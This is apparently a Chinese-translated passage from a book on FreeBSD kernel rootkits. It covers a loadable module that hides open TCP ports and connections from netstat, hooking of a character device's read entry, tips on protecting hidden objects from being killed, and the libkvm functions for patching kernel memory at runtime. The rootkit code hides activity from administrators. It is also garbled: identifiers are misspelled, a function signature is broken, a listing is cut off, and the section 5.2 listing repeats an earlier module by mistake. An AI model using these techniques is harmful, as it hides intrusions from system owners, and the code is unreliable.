
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/system.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.var>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

struct port_hiding_args {
    u_int16_t lport;      /* 本地端口 */
};

/* 隐藏打开端口的系统调用。 */
static int
port_hiding(struct thread *td, void *syscall_args)
{
    struct port_hiding_args *uap;
    uap = (struct port_hiding_args *)syscall_args;
    struct inpcb *inpcb;

    /* 遍历基于 TCP 的 inpcb 列表。 */
    LIST_FOREACH(inpcb, tcbinfo.listhead, inp_list) {
        if (inpcb->inp_vflag & IN_TIMEWAIT)
            continue;
        IN_LOCK(inpcb);

        /* 我们想隐藏这个本地打开端口吗？ */
        if (uap->lport == ntohs(inpcb->inp_inc.inc.ie_ie_lport)) {
            LIST_REMOVE(inpcb, inp_list);
            INP_UNLOCK(inpcb);
        } else {
            INP_UNLOCK(inpcb);
        }
    }

    UN_LOCK(&tcbinfo);
    return(0);
}

/* 新系统调用的 systent。 */
static struct systent port_hiding_systent = {
    1,              /* 参数数量 */
    port_hiding     /* 实现函数 */
};

/* 在 systent[] 中分配系统调用的偏移量。 */
static int offset = NO_SYSCALL;

/* 加载/卸载时调用的函数。 */
static int
load(struct module *module, int cmd, void *arg)
{
    int error = 0;
    switch (cmd) {
        case MOD_LOAD:
            printf("系统调用加载到偏移量 %d。\n", offset);
            break;
        case MOD_UNLOAD:
            printf("系统调用从偏移量 %d 卸载。\n", offset);
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }
    return(error);
}

SYSCALL_MODULE(port_hiding, offset, &port_hiding_systent, load, NULL);

列表 3-3: port_hiding.c

这段代码中一个有趣的细节是，我们检查了每个 `inpcb` 结构的 `inp_vflag` 成员。如果发现 inpcb 处于 2MS 等待状态，我会跳过它。隐藏一个即将关闭的端口有什么意义呢？

> ² 当 TCP 连接执行主动关闭并发送最后的 ACK 时，连接将进入 2MS 等待状态，持续时间最大最大段寿命的两倍。这使得 TCP 连接在第一个 ACK 丢失的情况下重发最后的 ACK。

在下面的输出中，到远程机器执行 `telnet(1)`，然后调用 `port_hiding` 来隐藏该会话：

```
$ telnet 192.168.123.107
Trying 192.168.123.107...
Connected to 192.168.123.107.
Escape character is '^]'.
Trying SRA secure login:
User (ghost):
Password:
[ SRA accepts you ]
FreeBSD/1386 (alpha) tty0
Last login: Mon Mar 5 09:55:50 on tty1
$ sudo kload /port_hiding.ko
System call loaded at offset 210.
$ netstat -anc tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address Foreign Address (state)
tcp4 0 0 192.168.123.107 192.168.123.153.61141 ESTABLISHED
tcp4 0 0 *.* LISTEN
tcp4 0 0 127.0.0.1.25 *.* LISTEN
$ perl -e 'syscall(210, 23);'
$ netstat -ancp tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address Foreign Address (state)
tcp4 0 0 127.0.0.1.25 *.* LISTEN
```

注意 `port_hiding` 如何隐藏了本地 telnet 服务器以及连接。要改变这种行为，只需重写 `port_hiding` 以接收两个参数：本地端口和本地地址。

## 3.7 损坏内核数据

在结束本章之前，让我们考虑以下情况：当你的隐藏对象被发现并杀死时会发生什么？

最好的情况下，什么都不会发生。最坏的情况下，当对象被杀死时，内核会无条件地从各种列表中移除。然而，在这种情况下，对象已经被移除。因此，内核将无法找到它，并越过列表边界，在此过程中损坏数据结构。

为了防止这种数据损坏，这里有一些建议：

- 挂钩终止函数以防止它们移除隐藏对象。
- 挂钩终止函数以便终止之前将你的隐藏对象放回列表。
- 什么都不做。如果你的隐藏对象从未被发现，它们就永远无法被杀死——对吗？

```c
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/mutex.h>
```

```c
#include <fs/devfs/devfs_int.h>
extern TAILQ_HEAD(devp_priv) cdev_list;
```

```c
d_read_t      read_hook;
d_read_t      *read;
```

```c
/* read 入点 hook。 */
int
read_hook(struct cdev *dev
```

```c
/* 在加载/卸载时调用的函数。 */
static int
load(struct module *module, int cmd, void, void *arg) {
    int error = 0;
    struct cdev_priv *cdp;
    switch (cmd) {
    case MOD_LOAD:
        mtx_lock(&devmtx);
        /* 将 cd_example 的 read 入点替换为 read_hook。 */
        tailQ_FOREACH(cdp, &cdev_list, c_list) {
            if (strcmp(cdp->cdp_c_si_name, "cd_example") == 0) {
                read = cdp->cdp_c_si_devsw->d_read;
                cdp->cdp_c_si_devsw->d_read = read_hook;
            }
        }
        break;
        mtx_unlock(&devmtx);
        break;
    case MOD_UNLOAD:
        mtx_lock(&devmtx);
        /* 将一切恢复到正常。 */
        tailQ_FOREACH(cdp, &cdev_list, c_list) {
            if (strcmp(cdp->cdp_c_si_name, "cd_example") == 0) {
                cdp->cdp_c_si_devsw->d_read = read;
            }
        }
        break;
    }
}
```

```c
}
mtx_unlock(&devmtx);
break;
default:
  error = EOPNOTSUPP;
  break;
}
return(error);
```

```c
static moduled_data_t cd_example_hook_mod = {
  "cd_example_hook",    /* 模块名称 */
  load,                   /* 事件处理器 */
  NULL,                   /* 额外数据 */
};
```

```c
DECLARE_MODULE(cd_example_hook, cd_example_hook_mod, SI_SUB_DRIVERS,
SI_ORDER_MIDDLE);
```

列表 4-1: cd_example_hook.c

注意，在 ❶ 替换 `cd_example` 的 `read` 入点之前，❷ 备份了原始入点的内存地址。这允许你 ❸ 调用并 ❹ 恢复原始函数，而无需在代码中包含其定义。

在加载上述模块后与 `cd_example` 交互的结果如下：

```
$ sudo kldload ./cd_example_hook.ko
$ sudo ./interface Tell\ me something, my\ friend.\nWrote "Tell me something, my friend." to device /dev/cd_example
You ever dance with the devil in the pale moonlight?
Read "Tell me something, my friend." from device /dev/cd_example
```

## 4.2 结语

如你所见，KOH 在某种程度上类似于 DKOM，区别在于它使用调用钩（call hooks）而不是数据状态的变化。因此，本章并没有呈现任何“新”的内容（这也是为什么它如此短）。

# 5 运行时内核内存破解

![](img/bfd792ec0e2d264dd5185dbb1d3a3b80_82_0.png)

在之前的章节中，我们查看了向运行中的内核引入代码的经典方法：通过加载内核模块。在本章中，我们将查看如何使用用户态代码对运行中的内核进行补丁修复和增强。这是通过与 `/dev/kmem` 设备交互实现的，该设备允许我们读取和写入内核虚拟内存。换句话说，`/dev/kmem` 允许我们破解控制内核逻辑各种代码字节（加载在可执行内存空间中）。这通常被称为运行时内核内存破解（patch）。

## 5.1 内核数据访问库

内核数据访问库 (`libkvm`) 提供了一个通过 `/dev/kmem` 设备访问内核虚拟内存的统一接口。`libkvm` 的以下六个函数构成了运行时内核内存破解的基础。

### 5.1.1 kvm_openfiles 函数

通过调用 `kvm_openfiles` 函数初始化对内核虚拟内存的访问。如果 `kvm_openfiles` Success，将返回一个描述符用于后续所有的 `libkvm` 调用。如果遇到错误，则返回 NULL。以下是 `kvm_openfiles` 的函数原型：

```c
#include <fcntl.h>
#include <kvm.h>

kvm_t *
vm_openfiles(const char *execfile, const char *corefile,
const char *swapfile, int flags, char *errbuf);
```

以下是每个参数的简要描述。

- `execfile`: 指定要检查的内核镜像，它必须包含符号表。如果此参数设置为 NULL，则检查当前运行的内核镜像。
- `corefile`: 这是内核内存设备文件；必须设置为 `/dev/mem` 或由 `savecore(8)` 生成的转储。如果此参数设置为 NULL，则使用 `/dev/mem`。
- `swapfile`: 该参数未使用；因此始终设置为 NULL。
- `flags`: 该参数指示核心文件的读/写权限。必须设置为以下常量之一：
    - `O_RDONLY`: 仅读。
    - `O_WRONLY`: 仅写。
    - `O_RDWR`: 读写。
- `errbuf`: 如果 `kvm_openfiles` 遇到错误，错误信息将写入此参数。

### 5.1.2 kvm_nlist 函数

`kvm_nlist` 函数从内核镜像检索符号表项。

```c
#include <kvm.h>
#include <nlist.h>

int
kvm_nlist(kvm_t *kd, struct nlist *nlist);
```

这里，`nl` 是一个以空结尾的 `nlist` 结构数组。要正确使用 `kvm_nlist`，你需要知道 `struct nlist` 中的两个字段，特别是 `n_name`（内存加载的符号名称）和 `n_value`（符号地址）。`kvm_nlist` 函数遍历 `nl`，通过 `n_name` 字段查找每个符号；如果找到，则相应填充 `n_value`；否则设置为 0。

### 5.1.3 kvm_geterr 函数

`kvm_geterr` 函数返回描述内核虚拟内存描述符最近状态的字符串。

```c
#include <kvm.h>

char *
kvm_geterr(kvm_t *kd);
```

如果最近的 `libkvm` 调用没有产生错误，结果未定义。

### 5.1.4 kvm_read 函数

使用 `kvm_read` 函数从内核虚拟内存读取数据。如果读取成功，返回传输的字节数。否则，返回 -1。

```c
#include <kvm.h>

ssize_t
kvm_read(kvm_t *kd, void *buf, size_t len);
```

这里，`len` 是要读取的字节数。

### 5.1.5 kvm_write 函数

使用 `kvm_write` 函数将数据写入内核虚拟内存。

```c
#include <kvm.h>

ssize_t
kvm_write(kvm_t *kd, void *buf, size_t len);
```

这里，`len` 是要写入的字节数。返回值通常等于 `len`，除非发生错误（返回 -1）。

### 5.1.6 kvm_close 函数

通过调用 `kvm_close` 关闭内核内存描述符。

```c
#include <fcntl.h>
#include <kvm.h>

int
kvm_close(kvm_t *kd);
```

如果 `kvm_close` 成功，返回 0。否则，返回 -1。

## 5.2 破解代码

现在，有了上一节的函数，让我们破解一些内核内存。我将从一个基础示例开始。

```c
#include <types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <module.h>
#include <sys/kernel.h>
#include <string.h>
#include <stdio.h>
#include <kvm.h>
#include <fcntl.h>

/* 在加载/卸载时调用的函数。 */
static int
load(struct module *module, int cmd, void, void *arg) {
    int error = 0;
    struct cdev_priv *cdp;
    switch (cmd) {
    case MOD_LOAD:
        mtx_lock(&devmtx);
        /* 将 cd_example 的 read 入点替换为 read_hook。 */
        tailQ_FOREACH(cdp, &cdev_list, c_list) {
            if (strcmp(cdp->cdp_c_si_name, "cd_example") == 0) {
                read = cdp->cdp_c_si_devsw->d_read;
                cdp->cdp_c_si_devsw->d_read = read_hook;
            }
        }
        break;
        mtx_unlock(&devmtx);
        break;
    case MOD_UNLOAD:
        mtx_lock(&devmtx);
        /* 将一切恢复到正常。 */
        tailQ_FOREACH(cdp, &cdev_list, c_list) {
            if (strcmp(cdp->cdp_c_si_name, "cd_example") == 0) {
                cdp->cdp_c_si_devsw->d_read = read;
            }
        }
        break;
    }
}
```
